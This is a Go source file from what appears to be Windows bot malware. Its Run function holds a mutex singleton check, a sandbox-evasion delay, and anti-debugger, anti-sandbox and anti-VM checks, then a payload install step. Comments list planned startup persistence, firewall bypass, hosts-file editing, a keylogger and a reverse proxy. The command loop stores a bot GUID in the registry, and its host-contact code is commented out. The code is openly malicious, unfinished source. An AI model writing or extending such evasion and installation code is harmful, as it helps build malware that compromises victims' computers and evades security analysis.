package components

import (
	"os"
	"time"

	"golang.org/x/sys/windows/registry"
)

func handle_command() {

	// Load guid
	val, err := reg_read_key(registry.CURRENT_USER, regpath, "guid", registry.READ, false)
	if err != nil {
		guid = generate_guid()
		reg_create_or_update_value(registry.CURRENT_USER, regpath, "guid", guid, true)
	} else {
		guid = val.(string)
	}

	for {
		time.Sleep(time.Second * time.Duration(random_int(1, 5)))

		// for i := range botcore.hosts {

		// }
	}

}

func Run() {
	// Check singleton
	if is_already_exist(botcore.mutex_name) {
		os.Exit(0)
	}

	// Sleep for avoiding the detection of sandbox
	time.Sleep(time.Second * time.Duration(botcore.delay))

	// Try to fuck them all
	if botcore.anti_debug && is_debugger_exist() {
		return
	}

	if botcore.anti_sandbox && in_sandbox_now() {
		return
	}

	if botcore.anti_vm && in_vm_now() {
		return
	}

	// Install self
	if botcore.install {
		install_payload()
	}

	// Set auto startup and set firewall bypass

	// Anti-Process

	// Edit hosts

	// Setup keylogger

	// Reverse proxy

	go handle_command()
}
